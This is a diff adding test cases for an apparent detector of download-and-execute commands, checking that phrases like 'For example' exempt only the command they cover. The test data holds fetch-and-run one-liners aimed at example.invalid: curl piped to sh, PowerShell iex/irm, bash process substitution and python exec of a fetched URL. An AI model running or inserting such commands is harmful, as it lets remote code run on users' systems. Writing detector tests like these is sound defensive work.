@@ -275,6 +275,32 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b"iex (irm https://example.invalid/x)\n",
             b"irm https://example.invalid/api | ConvertFrom-Json\n",
         ),
+        # A documentary phrase exempts only the command its own line, or the line above, covers.
+        (
+            "script_download_execute",
+            b"curl https://example.invalid/i | sh\nFor example, wget can mirror a site.\n",
+            b"The following command is a common lure:\n"
+            b"curl https://example.invalid/setup.sh | bash\n",
+        ),
+        (
+            "script_download_execute",
+            b"iex (irm https://example.invalid/x)\n\nNotes\n\n"
+            b"The following command lists files: curl --list-only ftp://example.invalid/\n",
+            b"For example: iex (irm https://example.invalid/x)\n",
+        ),
+        (
+            "script_download_execute",
+            b"For example wget has a manual.\nbash <(curl -s https://example.invalid/i)\n",
+            b"For example: bash <(curl -s https://example.invalid/i)\n",
+        ),
+        (
+            "script_download_execute",
+            b'python3 -c "import urllib.request as u; '
+            b"exec(u.urlopen('https://example.invalid/x').read())\"\n"
+            b"\nNotes\n\nFor example, curl is a tool.\n",
+            b'For example: python3 -c "import urllib.request as u; '
+            b"exec(u.urlopen('https://example.invalid/x').read())\"\n",
+        ),
         (
             "script_download_execute",
             b'python3 -c "import urllib.request;exec(urllib.request.urlopen('
